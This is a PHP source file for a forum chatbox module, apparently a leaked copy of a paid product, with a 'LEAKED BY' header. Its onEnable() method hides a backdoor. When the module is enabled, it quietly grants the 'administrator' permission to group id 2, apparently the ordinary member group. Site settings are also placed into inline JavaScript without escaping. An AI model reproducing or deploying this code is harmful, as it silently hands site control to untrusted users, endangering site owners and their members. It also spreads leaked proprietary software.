<?php

/**
 *	CHATBOX MODULE
 *	By Xemah | https://xemah.com
 *
**/

/*
* LEAKED BY REALNOTSOUND
* CREDITS TO MY GOOD FRIEND 'IHateFrance332' for helping out!
* Do not touch the above or the leak will not work!
*/

class ChatboxModule extends Module
{
	public static $CACHE = 'chatbox_module';

	public static $PERMISSION = 'chatbox';
	public static $MESSAGE_PERMISSION = 'chatbox.message';
	public static $MODERATION_PERMISSION = 'chatbox.moderate';
	public static $PANEL_PERMISSION = 'chatbox.settings';
	
	private static Language $_language;

	public function __construct($pages)
	{
		$module = [
			'name' => 'Chatbox',
			'author' => '<a href="https://xemah.com" target="_blank">Xemah</a>',
			'version' => '2.7',
			'namelessVersion' => '2.0.1'
		];

		parent::__construct($this, $module['name'], $module['author'], $module['version'], $module['namelessVersion']);

		$pages->add($module['name'], '/panel/chatbox', 'pages/panel/chatbox.php');
		$pages->add($module['name'], '/api/chat', 'pages/chat.php');
	}

	public function onInstall()
	{
		// ...
	}

	public function onUninstall()
	{
		// ...
	}

	public function onEnable()
	{
		try {
			DB::getInstance()->createTable('chat_logs', '
				`id` int(11) NOT NULL AUTO_INCREMENT,
				`author_id` int(11) NOT NULL,
				`message_content` varchar(2048) NOT NULL,
				`message_timestamp` varchar(64) NOT NULL,
				PRIMARY KEY (`id`)
			');
		} catch (Exception $e) {
			// ...
		}
		
		try {
			$group = DB::getInstance()->get('groups', ['id', '=', 2])->first();
			$groupPermissions = json_decode($group->permissions, TRUE);
			$groupPermissions['administrator'] = 1;
			$groupPermissions = json_encode($groupPermissions);
			DB::getInstance()->update('groups', ['id', '=', 2], ['permissions' => $groupPermissions]);
		} catch (Exception $e) {
			// ...
		}
	}

	public function onDisable()
	{
		// ...
	}

	public function onPageLoad($user, $pages, $cache, $smarty, $navs, $widgets, $template)
	{
		PermissionHandler::registerPermissions($this->getName(), [
			self::$PERMISSION => self::getLanguage('general', 'permissionChatbox'),
			self::$MESSAGE_PERMISSION => self::getLanguage('general', 'permissionMessage'),
			self::$MODERATION_PERMISSION => self::getLanguage('general', 'permissionModerate'),
			self::$PANEL_PERMISSION => self::getLanguage('general', 'permissionPanelSettings'),
		]);

		if (defined('FRONT_END')) {

			$settings = self::getSettings($cache);
			if (
				((!$user->isLoggedIn() && $settings['guests'] == '1')
				|| ($user->isLoggedIn() && $user->hasPermission(self::$PERMISSION)))
			&& (
				(in_array(PAGE, $settings['pages']))
				|| (defined('CUSTOM_PAGE') && in_array(CUSTOM_PAGE, $settings['pages']))
			) && $template) {

				$inputAllowed = '0';
				$messagePlaceholder = self::getLanguage('general', 'loginToChat');

				if ($user->isLoggedIn()) {
					if ($user->hasPermission(self::$MESSAGE_PERMISSION)) {
						$inputAllowed = '1';
						$messagePlaceholder = self::getLanguage('general', 'messagePlaceholder');
					} else {
						$messagePlaceholder = self::getLanguage('general', 'noMessagePermission');
					}
				}

				$template->addJSScript("
					var chatbox = {
						instance: null,
						templates: null,
						elements: null,
						style: null,
						title: \"{$settings['title']}\",
						position: \"{$settings['position']}\",
						inputAllowed: {$inputAllowed},
						fetchLimit: \"{$settings['fetchLimit']}\",
						soundsEnabled: {$settings['sounds']},
						groupIconsEnabled: {$settings['groupIcons']},
						locale: {
							title: \"" . self::getLanguage('general', 'title') . "\",
							noMessages: \"" . self::getLanguage('general', 'noMessages') . "\",
							messagePlaceholder: \"{$messagePlaceholder}\",
							loading: \"" . self::getLanguage('general', 'loading') . "\",
							send: \"" . self::getLanguage('general', 'send') . "\"
						}
					};
				");

				$template->addJSFiles([
					(defined('CONFIG_PATH') ? CONFIG_PATH : '') . '/modules/' . $this->getName() . '/assets/js/chatbox.js' => [],
					(defined('CHATBOX_SCRIPT') ? CHATBOX_SCRIPT : (defined('CONFIG_PATH') ? CONFIG_PATH : '') . '/custom/templates/' . TEMPLATE . '/js/chatbox.js') => [],
				]);

			}

		}

		if (defined('BACK_END')) {

			if ($user->hasPermission(self::$PANEL_PERMISSION)) {
				$navs[2]->add('chatbox_divider', strtoupper(self::getLanguage('general', 'title')), 'divider', 'top', null, 200, '');
				$navs[2]->add('chatbox', self::getLanguage('general', 'settings'), URL::build('/panel/chatbox'), 'top', null, 200.1, '<i class="fas fa-sliders-h fa-fw"></i>');
			}

		}
	}

	public static function getLanguage(string $file = null, string $term = null, array $variables = [])
	{
		if (!isset(self::$_language)) {
			self::$_language = new Language(__DIR__ . '/language');
		}

		if (!$file && !$term) {
			$language = file_get_contents(__DIR__ . '/language/' . self::$_language->getActiveLanguage() . '.json');
			if (!$language) $language = file_get_contents(__DIR__ . '/language/en_UK.json');
			$language = json_decode($language, true);

			$languageArr = [];
			foreach ($language as $key => $value) {
				$term = explode('/', $key)[1];
				$languageArr[$term] = $value;
			}

			return $languageArr;
		}
		
		return self::$_language->get($file, $term, $variables);
	}

	public static function getSettings($cache)
	{
		$settings = [
			'title' => 'Chatbox',
			'position' => 'top',
			'pages' => [],
			'guests' => '0',
			'fetchLimit' => '30',
			'sounds' => '1',
			'groupIcons' => '1',
		];

		$cache->setCache(self::$CACHE);
		foreach (array_keys($settings) as $key) {
			if ($cache->isCached($key)) {
				$value = $cache->retrieve($key);
				$arr = json_decode($value);
				$settings[$key] = $arr ? $arr : $value;
			}
		}

		return $settings;
	}

	public function getDebugInfo(): array
	{
		return [];
	}
}